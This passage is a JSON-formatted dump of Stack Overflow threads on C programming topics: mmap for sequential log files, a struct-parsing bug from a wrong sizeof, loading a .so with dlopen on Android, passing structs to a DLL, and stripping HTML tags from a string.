rel=\"noreferrer\"><code>mremap function</code></a> out there, yet it states</p>\n\n<blockquote>\n  <p>This call is Linux-specific, and should not be used in programs\n         intended to be portable.</p>\n</blockquote>\n\n<p><strong>Ad Q2:</strong></p>\n\n<p>I'm not sure if I understood that point right. If you want to tell the kernel \"and now load the next page\", then no, this is not possible (at least to my knowledge). But see <em>Ad Q3</em> on how to advise the kernel.</p>\n\n<p><strong>Ad Q3:</strong></p>\n\n<p>You can use <code>madvise</code> with the flag <code>MADV_SEQUENTIAL</code>, yet keep in mind that this does not enforce the kernel to read ahead, but only advices it.</p>\n\n<p>Excerp form the <a href=\"http://www.gnu.org/software/libc/manual/html_node/Memory_002dmapped-I_002fO.html\" rel=\"noreferrer\">man</a>:</p>\n\n<blockquote>\n  <p>This <strong>may</strong> cause the kernel to aggressively read-ahead</p>\n</blockquote>\n\n<p><strong>Personal conclusion:</strong></p>\n\n<p>Do not use <code>mmap</code> for sequential data writing. It will just cause much more overhead and will lead to much more \"unnatural\" code than a simple writing alogrithm using <code>fwrite</code>.</p>\n\n<p>Use <code>mmap</code> for random access reads to large files.</p>\n\n<p>This are also the results that were obtained during my thesis. I was not able to achieve any speedup by using <code>mmap</code> for sequential writing, in fact, it was always slower for this purpose.</p>\n"}, {"comments": [{"owner": {"reputation": 2477, "user_id": 799204, "user_type": "registered", "accept_rate": 60, "profile_image": "https://i.stack.imgur.com/CNmjQ.jpg?s=128&g=1", "display_name": "sourcejedi", "link": "https://stackoverflow.com/users/799204/sourcejedi"}, "edited": false, "score": 0, "creation_date": 1502437534, "post_id": 35892249, "comment_id": 78218458, "body": "strangely recent results see mmap() <i>reads</i> as either <a href=\"https://jvns.ca/blog/2014/05/12/computers-are-fast/\" rel=\"nofollow noreferrer\">matching</a> or <a href=\"https://web.archive.org/web/20170711083542/http://blog.burntsushi.net/ripgrep\" rel=\"nofollow noreferrer\">surpassing</a> read() performance <i>on large files</i>.  So there are cases where it may help."}, {"owner": {"reputation": 149158, "user_id": 524368, "user_type": "registered", "accept_rate": 83, "profile_image": "https://i.stack.imgur.com/oZ8Up.png?s=128&g=1", "display_name": "datenwolf", "link": "https://stackoverflow.com/users/524368/datenwolf"}, "reply_to_user": {"reputation": 2477, "user_id": 799204, "user_type": "registered", "accept_rate": 60, "profile_image": "https://i.stack.imgur.com/CNmjQ.jpg?s=128&g=1", "display_name": "sourcejedi", "link": "https://stackoverflow.com/users/799204/sourcejedi"}, "edited": false, "score": 0, "creation_date": 1502453263, "post_id": 35892249, "comment_id": 78228683, "body": "@sourcejedi: Link? Which block size did they use? Also see <a href=\"https://eklitzke.org/efficient-file-copying-on-linux\" rel=\"nofollow noreferrer\">eklitzke.org/efficient-file-copying-on-linux</a>"}, {"owner": {"reputation": 2477, "user_id": 799204, "user_type": "registered", "accept_rate": 60, "profile_image": "https://i.stack.imgur.com/CNmjQ.jpg?s=128&g=1", "display_name": "sourcejedi", "link": "https://stackoverflow.com/users/799204/sourcejedi"}, "edited": false, "score": 0, "creation_date": 1502454804, "post_id": 35892249, "comment_id": 78229690, "body": "<a href=\"https://github.com/jvns/howcomputer/blob/master/bytesum.c\" rel=\"nofollow noreferrer\">64K</a> in link 1.  ripgrep (link 2) currently appears to use <a href=\"https://github.com/BurntSushi/ripgrep/blob/master/src/search_stream.rs#L20\" rel=\"nofollow noreferrer\">8K</a>. So good point, thanks.  Your link is confused, in that it explains the graph in terms of readahead, but the graph data is for the completely virtual (in-ram) device /dev/zero."}], "tags": [], "owner": {"reputation": 149158, "user_id": 524368, "user_type": "registered", "accept_rate": 83, "profile_image": "https://i.stack.imgur.com/oZ8Up.png?s=128&g=1", "display_name": "datenwolf", "link": "https://stackoverflow.com/users/524368/datenwolf"}, "is_accepted": false, "score": 6, "last_activity_date": 1457528187, "creation_date": 1457528187, "answer_id": 35892249, "question_id": 35891525, "link": "https://stackoverflow.com/questions/35891525/mmap-for-writing-sequential-log-file-for-speed/35892249#35892249", "title": "mmap for writing sequential log file for speed?", "body": "<blockquote>\n  <p>using mmap (for speed). What is the best procedure?</p>\n</blockquote>\n\n<p>Don't use <code>mmap</code>, use <code>write</code>. Seriously. Why do people always seem to think that <code>mmap</code> would somehow magically speed things up?</p>\n\n<p>Creating a <code>mmap</code> is not cheap, those page tables are not going to populate by themself. When you want to append to a file you have to</p>\n\n<ul>\n<li>truncate to new size (with modern file systems that's quite cheap actually)</li>\n<li>unmap the old mapping (leaving around dirty pages that may or may not have to be written out)</li>\n<li>mmap the new mapping, which requires populating of page tables. Also every time to write to a previously unfaulted page, you're invoking the page fault handler.</li>\n</ul>\n\n<p>There are a few good uses for mmap, for example when doing random access reads in a large data set or recurrent reads from the same dataset.</p>\n\n<p>For further elaboration I'll refer to Linus Torvalds himself:</p>\n\n<p><a href=\"http://lkml.iu.edu/hypermail/linux/kernel/0004.0/0728.html\" rel=\"noreferrer\">http://lkml.iu.edu/hypermail/linux/kernel/0004.0/0728.html</a></p>\n\n<blockquote>\n  <p>In article &lt;200004042249.SAA06325@op.net>, Paul Barton-Davis\n   wrote:\n  ></p>\n  \n  <blockquote>\n    <p>I was very disheartened to find that on my system the mmap/mlock\n    approach took <em>3 TIMES</em> as long as the read solution. It seemed to me\n    that mmap/mlock should be at least as fast as read. Comments are\n    invited.</p>\n  </blockquote>\n  \n  <p>People love mmap() and other ways to play with the page tables to\n  optimize away a copy operation, and sometimes it is worth it.</p>\n  \n  <p>HOWEVER, playing games with the virtual memory mapping is very\n  expensive in itself. It has a number of quite real disadvantages that\n  people tend to ignore because memory copying is seen as something very\n  slow, and sometimes optimizing that copy away is seen as an obvious\n  improvment.</p>\n  \n  <p>Downsides to mmap:</p>\n  \n  <ul>\n  <li><p>quite noticeable setup and teardown costs. And I mean <em>noticeable</em>. It's things like following the page tables to unmap everything cleanly. It's the book-keeping for maintaining a list of all the mappings. It's The TLB flush needed after unmapping stuff.</p></li>\n  <li><p>page faulting is expensive. That's how the mapping gets populated, and it's quite slow.</p></li>\n  </ul>\n  \n  <p>Upsides of mmap:</p>\n  \n  <ul>\n  <li><p>if the data gets re-used over and over again (within a single map operation), or if you can avoid a lot of other logic by just mapping something in, mmap() is just the greatest thing since sliced bread. This may be a file that you go over many times (the binary image of an executable is the obvious case here - the code jumps all around the place), or a setup where it's just so convenient to map the whole thing in without regard of the actual usage patterns that mmap() just wins. You may have random access patterns, and use mmap() as a way of keeping track of what data you actually needed.</p></li>\n  <li><p>if the data is large, mmap() is a great way to let the system know what it can do with the data-set. The kernel can forget pages as memory pressure forces the system to page stuff out, and then just automatically re-fetch them again.</p></li>\n  </ul>\n  \n  <p>And the automatic sharing is obviously a case of this..</p>\n  \n  <p>But your test-suite (just copying the data once) is probably pessimal\n  for mmap().</p>\n  \n  <p>Linus</p>\n</blockquote>\n"}], "owner": {"reputation": 68729, "user_id": 45654, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/zaEnW.png?s=128&g=1", "display_name": "stefanB", "link": "https://stackoverflow.com/users/45654/stefanb"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 5482, "favorite_count": 3, "accepted_answer_id": 35891885, "answer_count": 2, "score": 4, "last_activity_date": 1476916397, "creation_date": 1457526238, "question_id": 35891525, "link": "https://stackoverflow.com/questions/35891525/mmap-for-writing-sequential-log-file-for-speed", "title": "mmap for writing sequential log file for speed?", "body": "<p>I want to write log file, unstructured format (one line at a time), using <code>mmap</code> (for speed). What is the best procedure? Do I open empty file, <code>truncate</code> to 1 page size (write empty string to resize file?), then <code>mmap</code> - and repeat when mmaped area full?</p>\n\n<p>I usually use <code>mmap</code> for writing fixed size structures, usually just one page at a time, however this is for writing log files (anywhere from 0.5 - 10 Gb) using mmap but not sure what's the best practice once the first mmaped area is filled - <code>munmap</code>, resize file <code>truncate</code> and <code>mmap</code> next page ?</p>\n\n<p>While writing logs to memory area, I would tracking size, and <code>msync</code> , what is the proper handling once I get to the end of the mapped memory area?</p>\n\n<p>Let's say I never need to go back or overwrite existing data, so I only write new data to file.</p>\n\n<p>Q1: When I get to the end of mapped area do I <code>munmap</code>, <code>ftruncate</code> file to resize by another page size and <code>mmap</code> the next page ?</p>\n\n<p>Q2: Is there a standard way to pre-empt and have the next page ready in memory for next write? Do this on another thread when we get close to the end of mapped area ?</p>\n\n<p>Q3: Do I <code>madvise</code> for sequential access?</p>\n\n<p>This is for real time data processing with requirement to keep log file - currently I just write to file. Log file is unstructured, text format, line based.</p>\n\n<p>This is for linux/c++/c optionally testing on Mac (so no remap [?]).</p>\n\n<p>Any links/pointers to best practices appreciated.</p>\n"}, {"tags": ["c", "file", "pointers", "struct"], "comments": [{"owner": {"reputation": 361156, "user_id": 440558, "user_type": "registered", "accept_rate": 75, "profile_image": "https://i.stack.imgur.com/9ZYta.jpg?s=128&g=1", "display_name": "Some programmer dude", "link": "https://stackoverflow.com/users/440558/some-programmer-dude"}, "edited": false, "score": 2, "creation_date": 1457526032, "post_id": 35891376, "comment_id": 59443713, "body": "Try to step through the code, line by line, in a debugger, to see what it actually does."}, {"owner": {"reputation": 361156, "user_id": 440558, "user_type": "registered", "accept_rate": 75, "profile_image": "https://i.stack.imgur.com/9ZYta.jpg?s=128&g=1", "display_name": "Some programmer dude", "link": "https://stackoverflow.com/users/440558/some-programmer-dude"}, "edited": false, "score": 1, "creation_date": 1457526379, "post_id": 35891376, "comment_id": 59443979, "body": "By the way, are you sure about that first <code>PANELS</code> line, with id <code>1</code>? Wouldn&#39;t that last <code>1</code> (which gets written to <code>nOpenings</code>) on the line mean that the code expects one extra line to read? One extra line which doesn&#39;t exist, making the parser go out of sync."}, {"owner": {"reputation": 15295, "user_id": 3436922, "user_type": "registered", "accept_rate": 67, "profile_image": "https://i.stack.imgur.com/Y8KQX.jpg?s=128&g=1", "display_name": "LPs", "link": "https://stackoverflow.com/users/3436922/lps"}, "edited": false, "score": 0, "creation_date": 1457526937, "post_id": 35891376, "comment_id": 59444335, "body": "As already commented in the previous post: cancel <code>[]</code> for <code>openings</code> and <code>panels</code> members of structs."}, {"owner": {"reputation": 361156, "user_id": 440558, "user_type": "registered", "accept_rate": 75, "profile_image": "https://i.stack.imgur.com/9ZYta.jpg?s=128&g=1", "display_name": "Some programmer dude", "link": "https://stackoverflow.com/users/440558/some-programmer-dude"}, "edited": false, "score": 0, "creation_date": 1457526970, "post_id": 35891376, "comment_id": 59444361, "body": "Lastly, does this really compile without any errors or even warnings? Take for example the <code>panels</code> member of the <code>CHBStructure</code> structure, you declare <code>panels</code> as a <a href=\"https://en.wikipedia.org/wiki/Flexible_array_member\" rel=\"nofollow noreferrer\">flexible array</a> of pointers, what you want here is really just a pointer, i.e. <code>CHBPanel *panels;</code>. Same thing with the <code>openings</code> pointer in the <code>CHBPanel</code> structure. There are also some other errors, which might cause the problems you have, and for which I will add an answer."}, {"owner": {"reputation": 35, "user_id": 5977887, "user_type": "registered", "accept_rate": 50, "profile_image": "https://i.stack.imgur.com/7fZ7P.jpg?s=128&g=1", "display_name": "Carl Chester Ragudo", "link": "https://stackoverflow.com/users/5977887/carl-chester-ragudo"}, "reply_to_user": {"reputation": 361156, "user_id": 440558, "user_type": "registered", "accept_rate": 75, "profile_image": "https://i.stack.imgur.com/9ZYta.jpg?s=128&g=1", "display_name": "Some programmer dude", "link": "https://stackoverflow.com/users/440558/some-programmer-dude"}, "edited": false, "score": 0, "creation_date": 1457528335, "post_id": 35891376, "comment_id": 59445357, "body": "@JoachimPileborg Sorry for the typo, was testing the error catching for that line."}, {"owner": {"reputation": 35, "user_id": 5977887, "user_type": "registered", "accept_rate": 50, "profile_image": "https://i.stack.imgur.com/7fZ7P.jpg?s=128&g=1", "display_name": "Carl Chester Ragudo", "link": "https://stackoverflow.com/users/5977887/carl-chester-ragudo"}, "reply_to_user": {"reputation": 15295, "user_id": 3436922, "user_type": "registered", "accept_rate": 67, "profile_image": "https://i.stack.imgur.com/Y8KQX.jpg?s=128&g=1", "display_name": "LPs", "link": "https://stackoverflow.com/users/3436922/lps"}, "edited": false, "score": 0, "creation_date": 1457528385, "post_id": 35891376, "comment_id": 59445393, "body": "@LPs already did the correction. copied the wrong line. thanks for the correction!"}], "answers": [{"comments": [{"owner": {"reputation": 35, "user_id": 5977887, "user_type": "registered", "accept_rate": 50, "profile_image": "https://i.stack.imgur.com/7fZ7P.jpg?s=128&g=1", "display_name": "Carl Chester Ragudo", "link": "https://stackoverflow.com/users/5977887/carl-chester-ragudo"}, "edited": false, "score": 0, "creation_date": 1457528521, "post_id": 35891832, "comment_id": 59445482, "body": "Thanks! This corrected the problem with the loops and UB."}], "tags": [], "owner": {"reputation": 361156, "user_id": 440558, "user_type": "registered", "accept_rate": 75, "profile_image": "https://i.stack.imgur.com/9ZYta.jpg?s=128&g=1", "display_name": "Some programmer dude", "link": "https://stackoverflow.com/users/440558/some-programmer-dude"}, "is_accepted": false, "score": 1, "last_activity_date": 1457528536, "last_edit_date": 1457528536, "creation_date": 1457527076, "answer_id": 35891832, "question_id": 35891376, "link": "https://stackoverflow.com/questions/35891376/struct-and-file-handling/35891832#35891832", "title": "Struct and file handling", "body": "<p>When you allocate <code>pannels</code> you do</p>\n\n<pre><code>S-&gt;panels = malloc(S-&gt;nPanels*sizeof(CHBStructure));\n</code></pre>\n\n<p>The problem here is that you use <code>sizeof(CHBStructure)</code> instead of <code>sizeof(CHBPanel)</code>. The problem with this is that <code>sizeof(CHBStructure) &lt; sizeof(CHBPanel)</code>, so you don't allocate enough memory for the data you read.</p>\n\n<p>That will lead to writing out of bounds, and <em>undefined behavior</em>.</p>\n\n<p><strike>This is in <em>addition</em> to the \"typo\" in the input file, which will lead you to enter the inner loop when there's nothing to read.</strike></p>\n"}], "owner": {"reputation": 35, "user_id": 5977887, "user_type": "registered", "accept_rate": 50, "profile_image": "https://i.stack.imgur.com/7fZ7P.jpg?s=128&g=1", "display_name": "Carl Chester Ragudo", "link": "https://stackoverflow.com/users/5977887/carl-chester-ragudo"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 40, "favorite_count": 0, "answer_count": 1, "score": 0, "last_activity_date": 1457528536, "creation_date": 1457525815, "question_id": 35891376, "link": "https://stackoverflow.com/questions/35891376/struct-and-file-handling", "title": "Struct and file handling", "body": "<p>The program I am making must store the values in the text file on their respective variables. The problem seems to arise in the inner loop. I have the respective structs already defined. The program runs properly for the outer loop but when it proceeds in the inner loop, the file pointer does not read the proper values from the text file and outputs \"0.0\" and does not proceed with the processes from the outer loop altogether. </p>\n\n<p>my input file looks something like this:</p>\n\n<pre><code>GENERAL\n1   4\n\nPANELS\n1   2.1 3.1 4.1 5.1 6.1 7.1 1\n2   2.2 3.2 4.2 5.2 6.2 7.2 2\n    1   2.21    3.21    4.21    5.21\n    2   2.22    3.22    4.22    5.22\n3   2.3 3.3 4.3 5.3 6.3 7.3 0\n4   2.4 3.4 4.4 5.4 6.4 7.4 4\n    1   2.41    3.41    4.41    5.41\n    2   2.42    3.42    4.42    5.42\n    3   2.43    3.43    4.43    5.43\n    4   2.44    3.44    4.44    5.44\n\nMATERIAL\n1   1000.0  2000.0  3000.0  4000.0\n2   1010.0  2020.0  3030.0\n3   1010.1  2020.2\n\nCHB\n1   10  20  30  2\n2   11  22  33  1\n</code></pre>\n\n<p>these are just placeholders to see if they are stored. single digits are integers while floats have decimal points. </p>\n\n<p>here is the code</p>\n\n<pre><code>typedef struct _open\n{\n    int id;\n    double length;\n    double height;\n    double origX;\n    double origY;\n    int frames;\n\n    double thickness;\n    double E;\n    double v;\n}CHBOpening;\n\ntypedef struct _panels\n{\n    int id;\n    double length;\n    double height;\n    double origX;\n    double origY;\n    double origZ;\n    double angle;\n    int nOpenings;\n    int nReinforcement;\n    double *xReinf;\n    double sx;\n    double xReinf0;\n\n    CHBUnit *chb;\n    CHBOpening *openings[];\n}CHBPanel;\n\ntypedef struct _chb\n{\n    int nStories;\n    int nModes;\n    int nIter;\n    int nPanels;\n    CHBPanel *panels[];\n}CHBStructure;\nint ReadPanelBlock (FILE *fp, CHBStructure *S)\n{\n    int i,j;\n    S-&gt;panels = malloc(S-&gt;nPanels*sizeof(CHBStructure));\n    for (i=0; i&lt; S-&gt;nPanels; i++)\n    {\n        fscanf(fp,\"%d\",&amp;S-&gt;panels[i].id);\n        fscanf(fp,\"%lf\",&amp;S-&gt;panels[i].length);\n        fscanf(fp,\"%lf\",&amp;S-&gt;panels[i].height);\n        fscanf(fp,\"%lf\",&amp;S-&gt;panels[i].angle);\n        fscanf(fp,\"%lf\",&amp;S-&gt;panels[i].origX);\n        fscanf(fp,\"%lf\",&amp;S-&gt;panels[i].origY);\n        fscanf(fp,\"%lf\",&amp;S-&gt;panels[i].origZ);\n        fscanf(fp,\"%d\",&amp;S-&gt;panels[i].nOpenings);\n        if (S-&gt;panels[i].nOpenings &gt; 0)\n        {\n            S-&gt;panels[i].openings = malloc(sizeof(CHBOpening)*S-&gt;panels[i].nOpenings);\n\n            for (j=0; j&lt;S-&gt;panels[i].nOpenings;j++)\n            {\n                fscanf(fp,\"%d\",&amp;S-&gt;panels[i].openings[j].id);\n                fscanf(fp,\"%lf\",&amp;S-&gt;panels[i].openings[j].length);\n                fscanf(fp,\"%lf\",&amp;S-&gt;panels[i].openings[j].height);\n                fscanf(fp,\"%lf\",&amp;S-&gt;panels[i].openings[j].origX);\n                fscanf(fp,\"%lf\",&amp;S-&gt;panels[i].openings[j].origY);\n            }\n        }\n    }\n    return 1;\n}\n</code></pre>\n"}, {"tags": ["android", "c", "java-native-interface"], "comments": [{"owner": {"reputation": 361156, "user_id": 440558, "user_type": "registered", "accept_rate": 75, "profile_image": "https://i.stack.imgur.com/9ZYta.jpg?s=128&g=1", "display_name": "Some programmer dude", "link": "https://stackoverflow.com/users/440558/some-programmer-dude"}, "edited": false, "score": 0, "creation_date": 1457525613, "post_id": 35891252, "comment_id": 59443402, "body": "Read about <a href=\"http://man7.org/linux/man-pages/man3/dlopen.3.html\" rel=\"nofollow noreferrer\"><code>dlopen</code></a> and related functions."}, {"owner": {"reputation": 127, "user_id": 5963168, "user_type": "registered", "accept_rate": 40, "profile_image": "https://graph.facebook.com/505264066346170/picture?type=large", "display_name": "&#201;n Xinh Lung Linh", "link": "https://stackoverflow.com/users/5963168/%c3%89n-xinh-lung-linh"}, "reply_to_user": {"reputation": 361156, "user_id": 440558, "user_type": "registered", "accept_rate": 75, "profile_image": "https://i.stack.imgur.com/9ZYta.jpg?s=128&g=1", "display_name": "Some programmer dude", "link": "https://stackoverflow.com/users/440558/some-programmer-dude"}, "edited": false, "score": 0, "creation_date": 1457525959, "post_id": 35891252, "comment_id": 59443657, "body": "Could you give me a example? I easily understand the problem by example"}, {"owner": {"reputation": 361156, "user_id": 440558, "user_type": "registered", "accept_rate": 75, "profile_image": "https://i.stack.imgur.com/9ZYta.jpg?s=128&g=1", "display_name": "Some programmer dude", "link": "https://stackoverflow.com/users/440558/some-programmer-dude"}, "edited": false, "score": 0, "creation_date": 1457526091, "post_id": 35891252, "comment_id": 59443752, "body": "Did you actually read the linked manual page? Did you look at the example at the bottom? Now when you know what functions to use, have you tried searching for other examples?"}, {"owner": {"reputation": 127, "user_id": 5963168, "user_type": "registered", "accept_rate": 40, "profile_image": "https://graph.facebook.com/505264066346170/picture?type=large", "display_name": "&#201;n Xinh Lung Linh", "link": "https://stackoverflow.com/users/5963168/%c3%89n-xinh-lung-linh"}, "reply_to_user": {"reputation": 361156, "user_id": 440558, "user_type": "registered", "accept_rate": 75, "profile_image": "https://i.stack.imgur.com/9ZYta.jpg?s=128&g=1", "display_name": "Some programmer dude", "link": "https://stackoverflow.com/users/440558/some-programmer-dude"}, "edited": false, "score": 0, "creation_date": 1457527722, "post_id": 35891252, "comment_id": 59444904, "body": "Yeah. Your reference for me is really good. Thats is what I&#39;m looking for. I&#39;m sorry for asking before read it carefully. Now I can understand. Btw, I want ask you one more thing. The .so file was built by ndk-build. Is it possible to work perfect with dlopen and  dlsym? Because I&#39;m new to this so I just ask to make sure before going deeper"}], "answers": [{"tags": [], "owner": {"reputation": 76010, "user_id": 168986, "user_type": "registered", "accept_rate": 86, "profile_image": "https://i.stack.imgur.com/MqorX.jpg?s=128&g=1", "display_name": "Clifford", "link": "https://stackoverflow.com/users/168986/clifford"}, "is_accepted": false, "score": 0, "last_activity_date": 1457526280, "creation_date": 1457526280, "answer_id": 35891542, "question_id": 35891252, "link": "https://stackoverflow.com/questions/35891252/how-to-use-so-file-in-c-code-android/35891542#35891542", "title": "How to use .so file in c code android", "body": "<p><a href=\"http://pubs.opengroup.org/onlinepubs/009695399/functions/dlopen.html\" rel=\"nofollow\">dlopen()</a> to load the library, followed by <a href=\"http://pubs.opengroup.org/onlinepubs/009695399/functions/dlsym.html\" rel=\"nofollow\">dlsym()</a> to obtain the address associated with a symbol defined in the library.</p>\n\n<pre><code>void* my_library = dlopen(\"libMine.so\", RTLD_LAZY);\nif (my_library == NULL) \n{\n   // report error ...\n} \nelse \n{\n   // use the result in a call to dlsym\n}\n</code></pre>\n"}], "owner": {"reputation": 127, "user_id": 5963168, "user_type": "registered", "accept_rate": 40, "profile_image": "https://graph.facebook.com/505264066346170/picture?type=large", "display_name": "&#201;n Xinh Lung Linh", "link": "https://stackoverflow.com/users/5963168/%c3%89n-xinh-lung-linh"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 339, "favorite_count": 0, "answer_count": 1, "score": -1, "last_activity_date": 1457526280, "creation_date": 1457525485, "question_id": 35891252, "link": "https://stackoverflow.com/questions/35891252/how-to-use-so-file-in-c-code-android", "title": "How to use .so file in c code android", "body": "<p>I have a .so file which I want to load and use functions in it for my android application. Normally, to use it with Java code I can use <code>System.loadLibrary()</code> <code>or System.load()</code></p>\n\n<p>However, I dont load it with Java code, I only want to load it with C code to call functions inside. But I dont know the right way to do it.\nEspecially, the .so file is not included in apk file. I want to use C code in apk and load the .so file locating on SDCARD</p>\n"}, {"tags": ["c++", "c", "dll", "struct"], "comments": [{"owner": {"reputation": 15295, "user_id": 3436922, "user_type": "registered", "accept_rate": 67, "profile_image": "https://i.stack.imgur.com/Y8KQX.jpg?s=128&g=1", "display_name": "LPs", "link": "https://stackoverflow.com/users/3436922/lps"}, "edited": false, "score": 0, "creation_date": 1457525830, "post_id": 35891165, "comment_id": 59443553, "body": "[THIS}(<a href=\"http://www.developerfusion.com/article/84519/mastering-structs-in-c/\" rel=\"nofollow noreferrer\">developerfusion.com/article/84519/mastering-structs-i&zwnj;&#8203;n-c</a>) could show you something about C# too."}], "answers": [{"comments": [{"owner": {"reputation": 14372, "user_id": 654019, "user_type": "registered", "accept_rate": 56, "profile_image": "https://www.gravatar.com/avatar/438148c9a2ac0c1bb66f92a3adbafac2?s=128&d=identicon&r=PG", "display_name": "mans", "link": "https://stackoverflow.com/users/654019/mans"}, "edited": false, "score": 0, "creation_date": 1457526349, "post_id": 35891350, "comment_id": 59443953, "body": "Thanks, do I need to annotate the struct with extern c? If I aam not doing this, what would happen? Is the standard for c++ different from C in this respect?"}, {"owner": {"reputation": 14372, "user_id": 654019, "user_type": "registered", "accept_rate": 56, "profile_image": "https://www.gravatar.com/avatar/438148c9a2ac0c1bb66f92a3adbafac2?s=128&d=identicon&r=PG", "display_name": "mans", "link": "https://stackoverflow.com/users/654019/mans"}, "edited": false, "score": 0, "creation_date": 1457526459, "post_id": 35891350, "comment_id": 59444034, "body": "is the packing setup on dll compiler and application compiler would effect this?"}], "tags": [], "owner": {"reputation": 221394, "user_id": 366904, "user_type": "moderator", "accept_rate": 82, "profile_image": "https://www.gravatar.com/avatar/3f8912af19fe86b7b34a0b011a962460?s=128&d=identicon&r=PG", "display_name": "Cody Gray", "link": "https://stackoverflow.com/users/366904/cody-gray"}, "is_accepted": true, "score": 2, "last_activity_date": 1457526161, "last_edit_date": 1457526161, "creation_date": 1457525741, "answer_id": 35891350, "question_id": 35891165, "link": "https://stackoverflow.com/questions/35891165/passing-struct-to-a-dll/35891350#35891350", "title": "passing struct to a dll", "body": "<p>The C ABI is well-defined and stable, so this works fine. To ensure that you are getting that C ABI if you are compiling as C++, you will need to annotate with <code>extern \"C\"</code>.</p>\n\n<p>The only thing you'll have trouble with is pointers to memory. Since there is no guarantee that the application and the DLL are using compatible run-time libraries, the code that allocated the memory must always be the one that frees it. You cannot have, for example, the application <code>malloc</code> a buffer, pass a pointer to that buffer to the DLL, and then expect the DLL to <code>free</code> the buffer. Either the application needs to <code>free</code> the buffer (since it's the one that called <code>malloc</code>), or the application will need to export a <code>MyFree</code> function that the DLL will call to free the memory.</p>\n"}], "owner": {"reputation": 14372, "user_id": 654019, "user_type": "registered", "accept_rate": 56, "profile_image": "https://www.gravatar.com/avatar/438148c9a2ac0c1bb66f92a3adbafac2?s=128&d=identicon&r=PG", "display_name": "mans", "link": "https://stackoverflow.com/users/654019/mans"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 1541, "favorite_count": 1, "accepted_answer_id": 35891350, "answer_count": 1, "score": 4, "last_activity_date": 1457526161, "creation_date": 1457525243, "question_id": 35891165, "link": "https://stackoverflow.com/questions/35891165/passing-struct-to-a-dll", "title": "passing struct to a dll", "body": "<p>I want to pass several data to a Dll function, so I am thinking of creating a struct and passing them to Dll dunction via a struct such as follow:</p>\n\n<pre><code>struct options\n{\nint op1,\nint op2,\nint op3,\nchar * op4,\n...\nchar * op10\n}\n\n void dllFunction(options myOptions)\n</code></pre>\n\n<p>As the dll should be implemented in a way that works on windows platform irrespective of what is the development tools is it, I am wondering :</p>\n\n<p>Is it valid to send data in this way? note that the structure members all are basic c types (int, float, double, ...). </p>\n\n<p>Why I am worried about it? as you know, different compilers implemented std classes differently, so you can not pass std classes over dll boundaries, but I am not sure if all of the compilers are placing struct members in the same way or they are not, as if they are not, then the code may not work with some compilers.</p>\n\n<p>is a struct is a simple c type data type?</p>\n\n<p>If I can not use a struct for this purpose, what is the best way to do this (passing a lot of data to a function inside a dll function?</p>\n"}, {"tags": ["html", "c", "string", "tags"], "comments": [{"owner": {"reputation": 40219, "user_id": 898348, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/13b3f2c44ba8449bd60764d07f4538dc?s=128&d=identicon&r=PG", "display_name": "Jabberwocky", "link": "https://stackoverflow.com/users/898348/jabberwocky"}, "edited": false, "score": 1, "creation_date": 1457524414, "post_id": 35890791, "comment_id": 59442616, "body": "Please show what you have tried."}, {"owner": {"reputation": 127623, "user_id": 2173917, "user_type": "registered", "accept_rate": 70, "profile_image": "https://i.stack.imgur.com/4dwoM.jpg?s=128&g=1", "display_name": "Sourav Ghosh", "link": "https://stackoverflow.com/users/2173917/sourav-ghosh"}, "edited": false, "score": 0, "creation_date": 1457524541, "post_id": 35890791, "comment_id": 59442703, "body": "Please show your research effort till time. Please read <a href=\"https://stackoverflow.com/questions/how-to-ask\">How to Ask</a> page first."}], "answers": [{"comments": [{"owner": {"reputation": 26941, "user_id": 2979617, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/whfql.png?s=128&g=1", "display_name": "M Oehm", "link": "https://stackoverflow.com/users/2979617/m-oehm"}, "edited": false, "score": 1, "creation_date": 1457524763, "post_id": 35890948, "comment_id": 59442844, "body": "<code>strstr</code> will find exact matches. I think the OP is interested in a solution that strips all tags, regardless of content. Also: have you tried your solution? It strips <code>S&#47;N1</code> as well."}, {"owner": {"reputation": 115, "user_id": 1610834, "user_type": "registered", "accept_rate": 71, "profile_image": "https://www.gravatar.com/avatar/51b0ad68b787ad16d4dda8ea0a257236?s=128&d=identicon&r=PG", "display_name": "user1610834", "link": "https://stackoverflow.com/users/1610834/user1610834"}, "edited": false, "score": 0, "creation_date": 1457524976, "post_id": 35890948, "comment_id": 59442971, "body": "Thank you for your input. Yes, I am indeed only trying to remove the html tags."}], "tags": [], "owner": {"reputation": 16091, "user_id": 4975822, "user_type": "registered", "accept_rate": 80, "profile_image": "https://www.gravatar.com/avatar/c04e8c4c984d36bea8a6239574980fbd?s=128&d=identicon&r=PG&f=1", "display_name": "artm", "link": "https://stackoverflow.com/users/4975822/artm"}, "is_accepted": false, "score": 1, "last_activity_date": 1457524600, "creation_date": 1457524600, "answer_id": 35890948, "question_id": 35890791, "link": "https://stackoverflow.com/questions/35890791/c-replacing-html-tags-in-a-string/35890948#35890948", "title": "C replacing html tags in a string", "body": "<p>You may try <code>strstr</code>, which returns a pointer to the first instance of the search string.</p>\n\n<pre><code>char line[] = \"&lt;a href=\\\"/cgi-bin/as-report?as=AS41299&amp;view=2.0\\\"&gt;S/N1&lt;/a&gt; Blahblahblah\";\nprintf( \"line = %s\\n\", line );\nchar *line_notag = strstr(line, \"&lt;/a&gt;\") + strlen(\"&lt;/a&gt;\"); // &lt;-- Find the first position of the html end tag &lt;/a&gt;, then move pass that tag to get the real string.\nprintf( \"line_notag = %s\\n\", line_notag ); // line_notag =  Blahblahblah\n</code></pre>\n"}, {"comments": [{"owner": {"reputation": 115, "user_id": 1610834, "user_type": "registered", "accept_rate": 71, "profile_image": "https://www.gravatar.com/avatar/51b0ad68b787ad16d4dda8ea0a257236?s=128&d=identicon&r=PG", "display_name": "user1610834", "link": "https://stackoverflow.com/users/1610834/user1610834"}, "edited": false, "score": 0, "creation_date": 1457525882, "post_id": 35891214, "comment_id": 59443589, "body": "Thank you, this was what I was trying to achieve. I will look into this."}], "tags": [], "owner": {"reputation": 26941, "user_id": 2979617, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/whfql.png?s=128&g=1", "display_name": "M Oehm", "link": 